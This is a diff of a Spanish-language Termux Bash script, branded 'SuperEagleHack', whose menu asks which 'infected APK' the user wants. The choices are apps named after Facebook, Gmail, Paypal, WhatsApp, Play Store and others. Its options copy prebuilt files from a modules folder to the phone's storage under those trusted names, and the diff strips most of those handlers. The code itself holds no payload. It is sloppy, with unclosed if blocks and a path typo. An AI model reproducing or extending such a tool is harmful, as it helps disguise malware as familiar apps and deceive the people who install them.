@@ -13,6 +13,7 @@ trap ctrl_c 2
 
 
 	clear
+	echo -e "$R"
 	echo '
      | |  | |          | | \ \    / /  | | |         (_) | |
      | |__| | __ _  ___| | _\ \  / /_ _| | | ___  ___ _| | | ___
@@ -20,25 +21,22 @@ trap ctrl_c 2
      | |  | | (_| | (__|   <  \  / (_| | | |  __/ (__| | | | (_) |
      |_|  |_|\__,_|\___|_|\_\  \/ \__,_|_|_|\___|\___|_|_|_|\___/ 
 '|lolcat
-echo " " 
-
 	echo -e "       $B SuperEagleHack"
 	echo
 	printf "$Y"
 	echo -e "$C   [1] $Y virus.apk            $C [8] $Y Google.apk"
 	echo -e "$C   [2] $Y Calculadora.apk      $C [9] $Y Internet-gratis.apk"
-	echo -e "$C   [3] $Y Camara.apk           $C [10] $Y Operamini.apk"
-	echo -e "$C   [4] $Y Elite.apk            $C [11] $Y Paypal.apk"
-	echo -e "$C   [5] $Y Facebook.apk         $C [12] $Y Playstore.apk"
-	echo -e "$C   [6] $Y Galeria.apk          $C [13] $Y Termux.apk"
-	echo -e "$C   [7] $Y Gmail.apk            $C [14] $Y Whatsapp.apk"
-	
+    echo -e "$C   [3] $Y Camara.apk           $C [10] $Y Operamini.apk"
+    echo -e "$C   [4] $Y Elite.apk            $C [11] $Y Paypal.apk"
+    echo -e "$C   [5] $Y Facebook.apk         $C [12] $Y Playstore.apk"
+    echo -e "$C   [6] $Y Galeria.apk          $C [13] $Y Termux.apk"
+    echo -e "$C   [7] $Y Gmail.apk            $C [14] $Y Whatsapp.apk"
 	echo -e "$C   [15] $R Salir $B"
 	echo
 	echo
 
 
-	while read -p "Que apk infectada quieres?  >> " SIGN && [ -z $SIGN ]; do
+	while read -p "Que APK infectada quieres?  >> " SIGN && [ -z $SIGN ]; do
 		printf "$R
 		[super🐿] Porfavor escribe un numero valido
 		\n $W"
@@ -47,11 +45,12 @@ echo " "
 
 	if [ $SIGN -eq '1' ]; then
 		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
+		printf "$C [super]$G Generando Viruz apk$W \n"
 		echo
 		echo
-		cd $HOME/virusc/modulos     
-		cp $PREFIX/modulos/virus.jpg /sdcard
+		cd $PREFIX/bin/modulos
+                sleep 3
+		cp $PREFIX/bin/modulos/virus.jpg /sdcard
 		mv /sdcard/virus.jpg /sdcard/viruz.apk
 		echo
 		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
@@ -60,215 +59,6 @@ echo " "
 		echo
 		read enter
 		virusc
-
-	if [ $SIGN -eq '2' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Calculadora.apk /sdcard
-		mv /sdcard/Calculadora.apk /sdcard/Calculadora.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc		
-
-	if [ $SIGN -eq '3' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-        cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Camara.apk /sdcard
-		mv /sdcard/Camara.apk /sdcard/Camara.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-			if [ $SIGN -eq '4' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Elite.apk /sdcard
-		mv /sdcard/ELITE.apk /sdcard/Elite.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-			if [ $SIGN -eq '5' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-        cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Facebook.apk /sdcard
-		mv /sdcard/Facebook.apk /sdcard/Facebook.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-			if [ $SIGN -eq '6' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Galeria.apk /sdcard
-		mv /sdcard/Galeria.apk /sdcard/Galeria.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-
-	if [ $SIGN -eq '7' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Gmail.apk /sdcard
-		mv /sdcard/Gmail.apk /sdcard/Gmail.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-	if [ $SIGN -eq '8' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Google.apk /sdcard
-		mv /sdcard/Google.apk /sdcard/Google.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-	if [ $SIGN -eq '9' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Internet-gratis.apk /sdcard
-		mv /sdcard/Internet-gratis.apk /sdcard/Internet-gratis.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-	if [ $SIGN -eq '10' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Operamini.apk /sdcard
-		mv /sdcard/Operamini.apk /sdcard/Operamini.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-	if [ $SIGN -eq '11' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Paypal.apk /sdcard
-		mv /sdcard/Paypal.apk /sdcard/Paypal.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-	if [ $SIGN -eq '12' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Playstore.apk /sdcard
-		mv /sdcard/Playstore.apk /sdcard/Playstore.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-	if [ $SIGN -eq '13' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PREFIX/modulos/Termux.apk /sdcard
-		mv /sdcard/Termux.apk /sdcard/Termux.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
-
-	if [ $SIGN -eq '14' ]; then
-		echo
-		printf "$C [super]$G Generando Viruz app$W \n"
-		echo
-		echo
-		cd $HOME/virusc/modulos
-		cp $PHOME/modulos/Whatsapp.apk /sdcard
-		mv /sdcard/Whatsapp.apk /sdcard/Whatsapp.apk
-		echo
-		printf "$G \n \t Listoo Ahora esta en tu memoria interna!!"
-		echo
-		printf "$C presiona en $G enter $C para continuar"
-		echo
-		read enter
-		virusc	
 
 
 	elif [ $SIGN -eq '15' ]; then
@@ -283,6 +73,6 @@ echo " "
 
 
 	else
-	       bash $PREFIX/cvirus
+	       bash $PREFIX/bin/virusc
 
        fi
